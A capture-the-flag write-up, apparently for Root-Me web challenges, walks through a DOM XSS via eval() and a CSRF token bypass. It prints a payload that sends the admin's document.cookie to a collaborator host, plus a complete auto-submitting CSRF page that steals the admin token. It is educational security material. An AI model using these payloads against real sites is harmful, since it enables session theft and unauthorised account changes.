### **1.XSS DOM Based-Eval**
  
When entering the lab, we see an input field to enter the calculation. 

![image](https://user-images.githubusercontent.com/63194321/156353968-6a4a0869-1e18-4237-9834-0f4e7ec3349b.png)

When inputting a non-numeric input, there will be a warning that only `number +|-|*|/ number` can be entered. 

![image](https://user-images.githubusercontent.com/63194321/156354619-ead11962-1e26-4fc3-88f9-5745048366e6.png)

But this filter only happens in the first 3 characters. In addition to these 3 characters, we can enter as we please. 

Next we try to insert the script code into the code. 
> 1+1,alert(1)

![image](https://user-images.githubusercontent.com/63194321/156355376-5c833421-41b4-4ebd-8f60-3554bb5f0865.png)

There is a message to ignore `()` to protect the site.

we replace `()` with `"``"` and rewrite the payload.  
> 1+1,alert`1`

![image](https://user-images.githubusercontent.com/63194321/156357306-e644b7a7-f593-48b2-ac24-d591c0b584e8.png)

--> Website is XSS 

To complete the challenge we must have the admin cookie. 

After looking at the website's code, we discovered that the website uses `eval()` to perform calculations. 

![image](https://user-images.githubusercontent.com/63194321/156357906-83c33844-5961-473b-8a9e-0ef184243766.png)

Once learned that the `eval()` function can execute its internal javascript code. 

So in this lesson we can use `location` to send the website's cookies to the outside. 
> 1+1, location="http://your-burp-collaborator/?cookie"+document.cookie

![image](https://user-images.githubusercontent.com/63194321/156358606-a6db2abf-3f9e-46eb-8072-5f57289a6c21.png)

Copy the url to the contact page to send it to the admin. 

![image](https://user-images.githubusercontent.com/63194321/156358733-7a2fe94c-c3b8-4369-8837-12a0c3bd9c75.png)

Check on burp client 1 Http response contains flag.

![image](https://user-images.githubusercontent.com/63194321/156358887-cc465c6c-1e0e-4b92-aed9-1b7942e99c39.png)


### **2.CSRF-token bypass**

The interface of the website when entering inside. 

![image](https://user-images.githubusercontent.com/63194321/156359664-aa13e820-7582-4145-9eb5-fc1d4580bfe1.png)

The goal of this lab is to access the `private` section to get the flag 

![image](https://user-images.githubusercontent.com/63194321/156359830-4463f20e-fc8b-4df8-997d-cb9d35710589.png)

To have administrative rights, we must activate the account by editing the profile. To do that we need to use CSRF. 

But the site does use csrf_token to avoid CSRF implementation. 

![image](https://user-images.githubusercontent.com/63194321/156361742-f0a6e9dc-9e43-4bdf-b5a3-470540eab665.png)

What you need to do is bypass the csrf token. 

The site has a `/search` section that uses the GET method but doesn't have any authentication. 

![image](https://user-images.githubusercontent.com/63194321/156363648-d0c088e0-7dc9-48e4-ac6c-123539d9c0d2.png)

--> csrf_token is only in POST method.

We will use a script to get the admin's csrf_token.

```<script>
var x = new XMLHttpRequest();
function get() {
  x.open("GET","http://challenge01.root-me.org/web-client/ch23/index.php?action=profile",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
  }
}
</script>
```
The above js uses `XMLHttpRequest()` to get the web page content. 
After having the content of the website, it will browse to find the token and assign it to the `token` variable. 

After we have obtained the admin token, we will directly replace the admin token into the token in the POC of the CSRF code. 
``` <!DOCTYPE html>
<html>
<head>
    <title>csrf</title>
</head>
<body onload="get()">

<form id="form-payload" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="your_username"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="forged-token" name="token" value=""/>
  <input type="submit" value="go"/>
</form>

<script>
var x = new XMLHttpRequest();
function get() {
  x.open("GET","http://challenge01.root-me.org/web-client/ch23/index.php?action=profile",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("forged-token").value = token;
    document.getElementById("form-payload").submit();
  }
}
</script>
</body>
</html>
```
Copy the payload and paste it in the comment section of the contact. Wait a few minutes and then switch to private and see the results. 

![image](https://user-images.githubusercontent.com/63194321/156366243-13e4dcf9-cf9a-4ab5-856c-de81703faf0e.png)
